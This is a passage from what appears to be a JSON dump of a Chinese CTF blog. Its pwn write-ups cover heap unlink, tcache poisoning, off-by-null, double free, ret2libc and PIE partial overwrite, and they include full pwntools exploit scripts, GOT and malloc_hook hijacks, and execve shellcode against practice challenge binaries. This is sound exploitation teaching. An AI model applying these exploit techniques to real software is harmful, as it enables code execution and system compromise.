add(2,&#39;BBBB&#39;) dele(1) add(3,&#39;cccc&#39;) dele(1) add(1,&#39;aaaa&#39;) fd=0x6020d0-0x18 bk=0x6020d0-0x10 payload=p64(0)+p64(0x21)+p64(fd)+p64(bk)+p64(0x20) edit(1,payload) #6 dele(2) #7 unlink payload=p64(0)+p64(elf.got[&#39;free&#39;])+p64(0)+p64(0x6020c0)+p32(1)+p32(1)+p32(1) edit(1,payload) #8 edit(2,p64(0x400760)) edit(1,p64(0x602020)) dele(2) #dele(2) p.recvuntil(&#39;2. Big secret&#39;) puts_addr=u64(p.recvuntil(&#39;\\x7f&#39;)[-6:].ljust(8,&#39;\\x00&#39;)) print(hex(puts_addr)) base=puts_addr-libc.sym[&#39;puts&#39;] system=base+libc.sym[&#39;system&#39;] payload=p64(elf.got[&#39;atoi&#39;])+p64(0)+p32(1)+p32(1)+p32(1) edit(1,payload) edit(2,p64(system)) p.sendlineafter(&#39;3. Renew secret\\n&#39;,&#39;sh\\n&#39;) p.interactive()","categories":[],"tags":[{"name":"buu","slug":"buu","permalink":"http://example.com/tags/buu/"}]},{"title":"SWPUCTF_2019_p1KkHeap","slug":"SWPUCTF-2019-p1KkHeap","date":"2023-10-29T09:53:51.000Z","updated":"2023-10-30T05:28:56.413Z","comments":true,"path":"2023/10/29/SWPUCTF-2019-p1KkHeap/","link":"","permalink":"http://example.com/2023/10/29/SWPUCTF-2019-p1KkHeap/","excerpt":"","text":"所有操作总共限制在了0x12次 保护全开，限制了堆的大小在0x100，不能绕过tachebin机制 dele时没有将bss段上的堆指针清零，存在double free漏洞 最多只能申请8次堆 本想泄露堆的地址然后改size泄露地址，但是最后的dele会报错，不知道什么原因，而且申请的次数根本不够用，所以这个方法不行。add(0x40) #0 add(0x40) #1 add(0x10) #2 add(0x10) #3 dele(0) dele(1) dele(0) show(0) p.recvuntil(&#39;content: &#39;) m0_addr=u64(p.recv(6).ljust(8,&#39;\\x00&#39;)) print(hex(m0_addr)) #add(0x10,) add(0x40) edit(4,p64(m0_addr+0x50)) add(0x40) add(0x40) add(0x40) payload=p64(0)*3+p64(0x421) edit(7,payload) 这里libc2.27有一种特性，tcache_perthread_struct结构体在堆上，释放后大小在0x20到0x410的堆的地址会放在开始的0x250的堆那里，这里释放了三个堆，从0x557386b4a010开始，他是小端序存储放到了后边，第一个字节是0x10大小的堆的数量，然后依次是0x20,最多放7个，放完就放fastbin和unsortedbin里。 在主函数里有一个函数 它映射了一个地址在0x6666000，那么这道题很明显用shellcode写，把shellcode写在这个地址然后执行 首先先计算出tcache_perthread_struct结构体的地址，这里可以直接对一个堆释放两次add(0x100) add(0x100) dele(1) dele(1) show(1) p.recvuntil(&#39;content: &#39;) tache_addr=u64(p.recv(6).ljust(8,&#39;\\x00&#39;))-0x360 print(hex(tache_addr)) 再申请堆就能直接修改堆指针,改到tache_perthread_struct开始的地址add(0x100) #2 edit(2,p64(tache_addr)) 再申请两次，在tache_perthread能改到下面的地址,相对开始的偏移是0xc8,这里不太清楚为什么改到下面的bin指针，应该和堆管理器有关add(0x100) #3 add(0x100) #4 vmmap=0x66660000 edit(4,0xb8*&#39;\\x00&#39;+p64(vmmap)) 再申请堆，在0x66660000这个地址上写上shellcode，这里看到shellcode的大小是大于0x30的，至于为什么地址是0x66660300,其实后面改成shellcode以后的地址都可以，比如0x66660040以后add(0x100) #5 shellcode=shellcraft.open(&#39;flag&#39;,0) shellcode+=shellcraft.read(3,0x66660300,0x30) shellcode+=shellcraft.write(1,0x66660300,0x30) edit(5,shellcode) 当tache_perthread的size为0但所对应的首地址不为空时，再分配出去size会变成0xff大于7，再dele(0)会放在unsortedbin，因为大于0x80，此时可以泄露main_arena+96的地址，这个地址减0x70就是malloc_hook的地址dele(0) show(0) p.recvuntil(&#39;content: &#39;) malloc_hook=u64(p.recv(6).ljust(8,&#39;\\x00&#39;))-0x70 print(hex(malloc_hook)) 再以相同的方式改掉tachebin的地址edit(4,0xb8*&#39;\\x00&#39;+p64(malloc_hook)) 再申请一次0x100大小的堆，edit内容为0x66660000的地址，再申请一次堆即可提权expfrom pwn import* from LibcSearcher import * #p=remote(&quot;node4.buuoj.cn&quot;,) p=process(&quot;./SWPUCTF_2019_p1KkHeap&quot;) context.update(arch=&#39;amd64&#39;, os=&#39;linux&#39;, endian=&#39;little&#39;) context.log_level=&quot;debug&quot; libc=ELF(&#39;./libc-2.27.so&#39;) def add(size): p.sendlineafter(&#39;Your Choice: &#39;,&#39;1&#39;) p.sendlineafter(&#39;size: &#39;,str(size)) def show(index): p.sendlineafter(&#39;Your Choice: &#39;,&#39;2&#39;) p.sendlineafter(&#39;id: &#39;,str(index)) def edit(index,content): p.sendlineafter(&#39;Your Choice: &#39;,&#39;3&#39;) p.sendlineafter(&#39;id: &#39;,str(index)) p.sendlineafter(&#39;content: &#39;,content) def dele(index): p.sendlineafter(&#39;Your Choice: &#39;,&#39;4&#39;) p.sendlineafter(&#39;id: &#39;,str(index)) add(0x100) #0 add(0x100) #1 dele(1) dele(1) show(1) p.recvuntil(&#39;content: &#39;) tache_addr=u64(p.recv(6).ljust(8,&#39;\\x00&#39;))-0x360 print(hex(tache_addr)) add(0x100) #2 edit(2,p64(tache_addr)*2) add(0x100) #3 add(0x100) #4 vmmap=0x66660000 edit(4,0xb8*&#39;\\x00&#39;+p64(vmmap)) add(0x100) #5 shellcode=shellcraft.open(&#39;flag&#39;,0) shellcode+=shellcraft.read(3,0x66660300,0x30) shellcode+=shellcraft.write(1,0x66660300,0x30) edit(5,asm(shellcode)) dele(0) show(0) p.recvuntil(&#39;content: &#39;) malloc_hook=u64(p.recv(6).ljust(8,&#39;\\x00&#39;))-0x70 print(hex(malloc_hook)) #dele(0) edit(4,0xb8*&#39;\\x00&#39;+p64(malloc_hook)) add(0x100) #6 edit(6,p64(vmmap)) add(0x100) gdb.attach(p) sleep(1) p.interactive()","categories":[],"tags":[{"name":"buu","slug":"buu","permalink":"http://example.com/tags/buu/"}]},{"title":"NewStar","slug":"NewStar","date":"2023-10-25T12:52:55.000Z","updated":"2023-10-30T04:43:10.434Z","comments":true,"path":"2023/10/25/NewStar/","link":"","permalink":"http://example.com/2023/10/25/NewStar/","excerpt":"","text":"p1eee开了pie保护 可以溢出一字节 还有个后门函数 因为代码段和后门函数地址相差是非常近的，只差了一个字节，所以可以直接覆盖返回地址为后门函数地址，返回函数的地址一般都是move rbp ，rsp之类的，所以这里最后一字节改成’\\x69’,改成之前的都不行。 expfrom pwn import* from LibcSearcher import * p=remote(&quot;node4.buuoj.cn&quot;,29807) #p=process(&quot;./pie&quot;) context.log_level=&quot;debug&quot; payload=&#39;a&#39;*(0x28)+&#39;\\x69&#39; p.sendlineafter(&#39;A nice try to break pie!!!&#39;,payload) #gdb.attach(p) #sleep(1) #p.sendline(payload) p.interactive() ret2libc常规的64位的ret2libc题 区别在于最后的payload要在p64(binsh)后面加个ret的参数payload=&#39;a&#39;*0x28+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system) libc的话write_up是推荐手动计算，但是没给具体是什么版本的libc,用题目本身的，用buu自带提供的libc-2.23.so,libc-2.27.so都是打不通的。# libc.blukat.me 查询libc版本后手动计算（推荐） libc_base = puts_addr - 0x080970 system_addr = libc_base + 0x04f420b in_addr = libc_base + 0x1b3d88 expfrom pwn import * from LibcSearcher import * p=remote(&quot;node4.buuoj.cn&quot;,27215) #p=process(&quot;./ret2libc1&quot;) elf=ELF(&#39;./ret2libc1&#39;) #libc=ELF(&#39;./libc-2.23.so&#39;) #libc=elf.libc context.log_level=&quot;debug&quot; puts_plt=0x400520 puts_got=elf.got[&#39;puts&#39;] pop_rdi=0x400763 main=0x400698 ret=0x4006F1 payload=&#39;a&#39;*0x28+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main) p.sendlineafter(&#39;again&#39;,payload) p.recvuntil(&#39;time&#39;) #gdb.attach(p) sleep(1) puts_addr=u64(p.recvuntil(b&#39;\\x7f&#39;)[-6:].ljust(8,b&#39;\\x00&#39;)) #puts_addr=u64(p.recvuntil(&#39;\\n&#39;,drop=True).ljust(8,&#39;\\x00&#39;)) print(hex(puts_addr)) base=puts_addr-0x04f420 #-libc.sym[&#39;puts&#39;] system=base+0x080970 #libc.sym[&#39;system&#39;] binsh=base+0x1b3d88 #libc.search(&#39;bin/sh&#39;).next() payload=&#39;a&#39;*0x28+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system) p.sendlineafter(&#39;again&#39;,payload) p.interactive()","categories":[],"tags":[{"name":"ctf-NewSar","slug":"ctf-NewSar","permalink":"http://example.com/tags/ctf-NewSar/"}]},{"title":"login","slug":"login","date":"2023-10-23T12:48:27.000Z","updated":"2023-10-26T13:40:08.013Z","comments":true,"path":"2023/10/23/login/","link":"","permalink":"http://example.com/2023/10/23/login/","excerpt":"","text":"例行检查，这道题是静态的，函数多且看不懂 第十五行的Base64Decode函数，参数是s,用来将我们输入的s进行转换，是一个用于将base64格式的数据解码为二进制数据的函数，将转化后的值数据赋给v5，然后再把值给bss段上的input。 看向主函数，v7转化后的数据长度不能超过十二，输入测试发现输入的长度不能超过十一，因为输入的时候会加上换行符结束，send()可以发送十二个，sendline可以发送十一个字节，然后第二十二行把v7复制给了bss段上的input，然后是auth函数，会返回一段二进制数据编码。 payload这样写payload=&#39;aaaa&#39;+p32(0x8049284)+p32(0x811EB40) payload=base64.b64encode(payload) 只能刚好覆盖到ebp，因为最多输入0xc个字节，payload用函数编码为base64字符集，base64.b64encode（）函数是Python标准库中的一个函数，用于将二进制数据编码为Base64字符串，在程序中经过Base64Decode（）函数编码为二进制数据编码，也就是原来的数据，在程序中会把数据给bss段上的input，进入auth函数会将数据传给v4,v4的大小是八字节，会覆盖到ebp,ebp是input的地址0x811EB40,然后auth函数结束的时候，leave指令以后esp会指向0x811eb40，然后到下一个指令esp自动加四，esp=esp+4，也就是调用correct函数的地址，然后提权 expfrom pwn import* import base64 from LibcSearcher import * p=remote(&quot;node4.buuoj.cn&quot;,29010) #p=process(&quot;./login&quot;) context.log_level=&quot;debug&quot; shell=0x08049284 fake_addr=0x811eb40 # payload=&#39;a&#39;*0x4+p32(shell)+p32(fake_addr) payload=base64.b64encode(payload) #gdb.attach(p) sleep(1) p.sendlineafter(&#39;Authenticate :&#39;,payload) #p.sendline(payload) p.interactive()","categories":[],"tags":[{"name":"buu","slug":"buu","permalink":"http://example.com/tags/buu/"}]},{"title":"sctf_2019_easy_heap","slug":"sctf-2019-easy-heap","date":"2023-10-21T12:16:40.000Z","updated":"2023-10-22T14:37:00.423Z","comments":true,"path":"2023/10/21/sctf-2019-easy-heap/","link":"","permalink":"http://example.com/2023/10/21/sctf-2019-easy-heap/","excerpt":"","text":"这道题用off by null解例行检查，保护全开,不能利用got表，只能用hook的地址 程序运行前会执行一个函数，把buf的地址映射到某个0x1000大小的地址上，并返回这个地址，而且这个地址是可执行的，那么就可以用shellcode。mmap()函数的权限参数指定了将要映射到进程地址空间的内存区域的访问权限。权限参数可以是以下值之一： PROT_EXEC：允许对内存映射区域进行执行访问。 PROT_READ：允许对内存映射区域进行读取访问。 PROT_WRITE：允许对内存映射区域进行写入访问。 PROT_NONE：禁止对内存映射区域进行任何访问。 当权限参数的值为7时，实际上是将PROT_EXEC、PROT_READ和PROT_WRITE三个权限组合在一起，7=4+2+1。因此，权限参数为7表示将内存映射区域设置为可执行、读取和写入。在实际使用中，不建议将这些权限组合在一起，因为这可能会导致安全漏洞。通常建议只使用必要的权限来保护内存映射区域的安全性。 单独地把输入堆里的内容的函数放出来，双击一下，就是相当于read函数 按照题解里的流程，先创建一个0x410大小的堆，并接收其地址,这个地址存了malloc的堆的地址add(0x410) p.recvuntil(&#39;Address &#39;) chunk0_addr=int(p.recv(14),16) 然后再创建四个大小不同的堆 add(0x28) add(0x18) add(0x4f8) add(0x10) 然后free掉堆0dele(0) 然后edit堆2,也就是输入内容，构造下面的unlinkpayload=p64(0)*2+p64(0x420+0x20+0x30) 在free堆3后，就会unlink合并，四个堆合并在一起dele(3) free堆3 这里存堆0，堆3的指针都被清掉了。 再free堆1，堆2 然后又malloc两次,两个大小加起来刚好是0x970,会从原来的freechunk中拿。add(0x440) add(0x510) 然后编辑这两个堆的内容payload=p64(0x410)+p64(0)+p64(0x30)+p64(mmap_addr+0x10) fill(0,payload) fill(1,&#39;\\x30&#39;) 编辑完后，这是堆0的 成功修改了0x30的tachebin指针成mmap+10的地址，0x5577338a86b0这是最后一个堆的地址，tachebin机制在freechunk里的最后一个堆指向main_arena+96这个地址。 这是堆1的，bin指针修改成了malloc_hook的地址。 原本的话指向main_arena+96这个地址，改掉最后的字节成0x30就是malloc_hook的地址 再malloc两次，把多余的freechunk拿掉add(0x28)#2 add(0x18)#3 再add堆5，也就是在maap+10这个地址上放shellcode，手写shellcode是真的强好吧add(0x28)#5 payload2 = b&quot;\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05&quot; fill(5,payload2 + &#39;\\n&#39;) 再add堆6，大小在0x10到0x18之间才能在0x20的tachebin(malloc_hook)里申请，这里我们放上st_addr+0x10的地址，也就是maap_addr+0x10的地址。add(0x18)#6 edit(6,p64(st_addr + 0x10) + &#39;\\n&#39;) 这是堆5和堆6的地址，也就是mmap+10的地址和malloc_hook的地址 最后，再malloc一次，就会执行malloc_hook,而这个地址就会去执行mmap+0x10这个地址，这个地址放又shellcode，成功提权。expfrom pwn import* from LibcSearcher import * p=remote(&quot;node4.buuoj.cn&quot;,29573) #p=process(&quot;./sctf_2019_easy_heap&quot;) context(arch=&#39;amd64&#39;) context.log_level=&quot;debug&quot; libc=ELF(&#39;./libc-2.27.so&#39;) def add(size): p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;1&#39;) p.sendlineafter(&#39;Size: &#39;,str(size)) def fill(index,content): p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;3&#39;) p.sendlineafter(&#39;Index: &#39;,str(index)) p.sendlineafter(&#39;Content: &#39;,content) def dele(index): p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;2&#39;) p.sendlineafter(&#39;Index: &#39;,str(index)) p.recvuntil(&#39;Mmap: &#39;) mmap_addr=int(p.recv(12),16) print(hex(mmap_addr)) add(0x410) add(0x28) add(0x18) add(0x4f8) add(0x10) dele(0) payload=p64(0)*2+p64(0x420+0x20+0x30) fill(2,payload) dele(3) dele(1) dele(2) add(0x440) add(0x510) payload=&#39;a&#39;*(0x410)+p64(0)+p64(0x30)+p64(mmap_addr+0x10) fill(0,payload) fill(1,&#39;\\x30&#39;) add(0x28)#2 add(0x18)#3 add(0x28)#5 add(0x18)#6 payload2 = b&quot;\\x31\\xc0\\x48\\xbb\\xd1\\x9d\\x96\\x91\\xd0\\x8c\\x97\\xff\\x48\\xf7\\xdb\\x53\\x54\\x5f\\x99\\x52\\x57\\x54\\x5e\\xb0\\x3b\\x0f\\x05&quot; fill(5,payload2) fill(6,p64(mmap_addr + 0x10)) add(0x10) p.interactive()","categories":[],"tags":[{"name":"buu","slug":"buu","permalink":"http://example.com/tags/buu/"}]},{"title":"","slug":"gyctf_2020_some_thing_exceting","date":"2023-10-16T12:27:11.330Z","updated":"2023-10-16T12:50:52.369Z","comments":true,"path":"2023/10/16/gyctf_2020_some_thing_exceting/","link":"","permalink":"http://example.com/2023/10/16/gyctf_2020_some_thing_exceting/","excerpt":"","text":"gyctf_2020_some_thing_exceting有点奇怪的UAF题，double free 有点奇怪做这道题前先在根目录下创建一个flag文件，不然的话程序运行不起来 flag是在bss段上的，双击fgets里的s，可以看到flag是放在0x6020a8 除了没有edit函数，其他都有add函数，先创建一个0x10大小的堆，然后会再创建两个堆，0x10的堆上放两外的两个堆的地址，然后是输入内容。 show函数，将两个地址的内容都打印出来，后期是用来打印flag dele函数，没有把bss上的堆指针置零，存在UAF漏洞，可以double free 漏洞是利用double free ,先单独free同一个两次堆不行，得先创建两次bss=0x6020a8-0x10 add(0x40,&#39;MMMM&#39;,0x50,&#39;NNNN&#39;) add(0x40,&#39;AAAA&#39;,0x40,&#39;BBBB&#39;) dele(0) dele(1) 这是free掉第二个堆时候的样子以及其bin的样子，free函数的地址可以是零 dele(0) #double free 这里的话是double free ，形成两个循环链表，0x20大小的fastbin中0x1855240指向0x1852300，0x1852300指向0x1852240。0x50大小的fastbin中0x18522b0指向0x1852370等等 add(0x40,p64(bss),0x40,&#39;AAAA&#39;) 再add一下的话，会先在bin里取，这里的话把先在0x18522b0和0x2952370写上内容，然后就把bin链给改掉了0x50的fastbin这里指向了最后的flag地址 再add一次会把前面两个0x50大小的fastbin给拿掉，然后的只剩下最后一个flag的堆的地址add(0x40,&#39;MMMM&#39;,0x40,&#39;kkkk&#39;) 再malloc一次0x40的大小就能把flag堆地址改写到0x20大小的堆上，但是为了绕过fastbin的检查，得malloc 0x50的大小，所以前面也得改成0x50的大小，再show的话就会把flag输出出来，注意这里是第五个堆，因为前面的bss段上的堆指针都没有置零。show(4) 想在bss段上申请堆，需要0x50的大小才能绕过fastbin的检查，这里选0x602098刚好。 expfrom pwn import* from LibcSearcher import * #p=remote(&quot;node4.buuoj.cn&quot;,26884) p=process(&quot;./gyctf_2020_some_thing_exceting&quot;) elf=ELF(&#39;./gyctf_2020_some_thing_exceting&#39;) libc=ELF(&#39;./libc-2.23.so&#39;) context.log_level=&quot;debug&quot; def add(size1,content1,size2,content2): p.sendlineafter(&#39;Now please tell me what you want to do :&#39;,&#39;1&#39;) p.sendlineafter(&quot;&gt; ba&#39;s length : &quot;,str(size1)) p.sendlineafter(&#39;&gt; ba : &#39;,content1) p.sendlineafter(&quot;&gt; na&#39;s length : &quot;,str(size2)) p.sendlineafter(&#39;&gt; na : &#39;,content2) def dele(index): p.sendlineafter(&#39;Now please tell me what you want to do :&#39;,&#39;3&#39;) p.sendlineafter(&#39;Banana ID :&#39;,str(index)) def show(index): p.sendlineafter(&#39;Now please tell me what you want to do :&#39;,&#39;4&#39;) p.sendlineafter(&#39;&gt; Banana ID : &gt; SCP project ID : &#39;,str(index)) bss=0x6020a8-0x10 add(0x50,&#39;MMMM&#39;,0x50,&#39;NNNN&#39;) add(0x50,&#39;AAAA&#39;,0x50,&#39;BBBB&#39;) dele(0) dele(1) dele(0) add(0x50,p64(bss),0x50,&#39;AAAA&#39;) add(0x50,&#39;MMMM&#39;,0x50,&#39;kkkk&#39;) add(0x50,b&#39;1&#39;,0x60,b&#39;&#39;) show(4) #gdb.attach(p) sleep(1) #pause() #dele(0) #p.sendline(payload) p.interactive()","categories":[],"tags":[]},{"title":"","slug":"zctf_2016_note3","date":"2023-10-14T13:49:24.054Z","updated":"2023-10-15T05:14:09.930Z","comments":true,"path":"2023/10/14/zctf_2016_note3/","link":"","permalink":"http://example.com/2023/10/14/zctf_2016_note3/","excerpt":"","text":"zctf_2016_note3这道题函数较多，但是相对来说还是一般的堆题，函数多可一多理解，下面开始一一讲解。先看add函数 第十二行的size函数，是用来输入我们要申请大小的堆，点进去看有点复杂，但其实和scanf差不多，里面还有个sub_4008dd的函数，再点进去 sub_4008dd函数，这个相当于read函数，在下面的好几个函数都调用到，先看函数的参数第三个参数 char a3，其值是10，第一个参数a1是输入的地址，第二个是输入的size，一个个输入保存在v7中但是最长不会超过32的长度，遇到’\\x00’时结束，这里的a3=10其实就是截止符’\\xa’，后面两条已经不重要了。 最后返回的是我们输入的第十二行size的值。第十九行的sub_4008dd函数也是同理，不过输入的长度有size决定。外面的sub_400a30函数里的nptr是在bss段上的地址，存放的是malloc的地址，第一个存放地址，第二个加八的地址存放size edit函数，先看第16行的read函数，第一个参数 *(&amp;ptr + v3)其实就是存在堆上的地址，v3指的第几个堆，第二个参数，就是bss存堆地址再加8的地址，存放的是malloc的大小，和原来的一样，所以不存在堆溢出的情况。 dele函数，bss段上的地址清零，堆上的内容也被释放了，所以并不存在UAF漏洞 重点的地方在这，就是unlink的怎么构造。先构造四个个堆块，其中第一个堆堆0的fd和bk指针分别放fd=ptr-0x18和bk=ptr-0x10，后期会进行和并ptr=0x6020c8 fd=ptr-0x18 bk=ptr-0x10 payload1=p64(0)+p64(0xb1)+p64(fd)+p64(bk) add(0x90,payload1) #堆0 add(0,&#39;bbbb&#39;) #堆1 add(0x90,&#39;CCCC&#39;) #堆2 add(0x10,&#39;dddd&#39;) #堆3 dele(1) 关于第二个堆块，我们申请的是0的大小，但是ptmalloc会最少申请0x10,后期edit的时候是可以溢出的，从而覆盖掉堆指针。这里会有个问题就是为什么不在第一次malloc堆1的时候写入payload2，因为第一次的话事溢出不到堆2payload2=p64(0)*2+p64(0xb0)+p64(0xa0) add(0,payload2) 覆盖后的堆块是长这样的，把第堆2的大小和它的previous in use位改成了0,也就是上一个堆堆1没有使用 当删掉堆2的时候，它会检查堆1的两个指针，是满足条件的，其中的0xbbb018这个地址存放size的大小是包括到0xbbb0b0这里的（猜想），而0xbbb0c0这里的大小是previous size ,0xbbb0c8这里表示上一个堆没有使用。 当把堆2delete时，这几个堆就会进行合并dele之前，bss段上存放堆指针是这样的布局。 而在dele(2)后存放堆2的指针被置零了 这是堆合并后的样子，应该是堆1和堆2是没有被利用的然后和堆0合并了 0x151也就是中间0xbbb0c0这里的大小相加但是堆2这里的内存没有释放之后的bin是这样的 然后就可以从0x6020b0这个位置实行修改堆指针从而对got表的改写payload3 = p64(0) * 2 + p64(elf.got[&#39;free&#39;]) * 2 + p64(elf.got[&#39;atoi&#39;]) + p64(0) + p64(elf.got[&#39;atoi&#39;]) edit(0,payload3) 再把edit堆0,也就是edit0x602018（free_got)地址的内容改写成(0x400730)puts_pltedit(0,p64(0X400730)[:-1]) #puts_plt 这样再dele堆1的时候也就是free 0x6020d0这个地址，也就是puts(elf.got[‘atoi’]),从而获得atoi的got项的内容，从而可以算出libc的偏移atoi_addr = u64(p.recvuntil(&#39;\\x7f&#39;)[-6:].ljust(8, b&#39;\\x00&#39;)) success(&#39;atoi_addr = &#39; + hex(atoi_addr)) 然后再edit堆3，也就是0x6020e0这个地址，更改atoi的got表的地址为sytem，再从开始时候菜单有个atoi函数然后写入的内容为‘/bin/sh’就可以提权了。最后的expfrom pwn import* from LibcSearcher import * #p=remote(&quot;node4.buuoj.cn&quot;,) p=process(&quot;./zctf_2016_note3&quot;) elf=ELF(&#39;./zctf_2016_note3&#39;) libc=ELF(&#39;./libc-2.23.so&#39;) context.log_level=&quot;debug&quot; def add(size,content): p.sendlineafter(&#39;option---&gt;&gt;&#39;,&#39;1&#39;) p.sendlineafter(&#39;Input the length of the note content:(less than 1024)&#39;,str(size)) p.sendlineafter(&#39;Input the note content:&#39;,content) def edit(index,content): p.sendlineafter(&#39;option---&gt;&gt;&#39;,&#39;3&#39;) p.sendlineafter(&#39;Input the id of the note:&#39;,str(index)) p.sendlineafter(&#39;Input the new content:&#39;,content) def dele(index): p.sendlineafter(&#39;option---&gt;&gt;&#39;,&#39;4&#39;) p.sendlineafter(&#39;Input the id of the note:&#39;,str(index)) ptr=0x6020c8 fd=ptr-0x18 bk=ptr-0x10 payload1=p64(0)+p64(0xb1)+p64(fd)+p64(bk) add(0x90,payload1) add(0,&#39;bbbb&#39;) add(0x90,&#39;CCCC&#39;) add(0x10,&#39;dddd&#39;) dele(1) payload2=p64(0)*2+p64(0xb0)+p64(0xa0) add(0,payload2) dele(2) #he bing payload3 = p64(0) * 2 + p64(elf.got[&#39;free&#39;]) * 2 + p64(elf.got[&#39;atoi&#39;]) + p64(0) + p64(elf.got[&#39;atoi&#39;]) edit(0,payload3) edit(0,p64(0X400730)[:-1]) #puts_plt dele(1) #dele di 0 ge dui atoi_addr = u64(p.recvuntil(&#39;\\x7f&#39;)[-6:].ljust(8, b&#39;\\x00&#39;)) success(&#39;atoi_addr = &#39; + hex(atoi_addr)) #gdb.attach(p) sleep(1) base=atoi_addr-libc.sym[&#39;atoi&#39;] system=base+libc.sym[&#39;system&#39;] edit(3,p64(system)) p.sendline(&#39;/bin/sh&#39;) #p.sendline(payload) p.interactive()","categories":[],"tags":[]}],"categories":[],"tags":[{"name":"buu","slug":"buu","permalink":"http://example.com/tags/buu/"},{"name":"ctf-NewSar","slug":"ctf-NewSar","permalink":"http://example.com/tags/ctf-NewSar/"}]}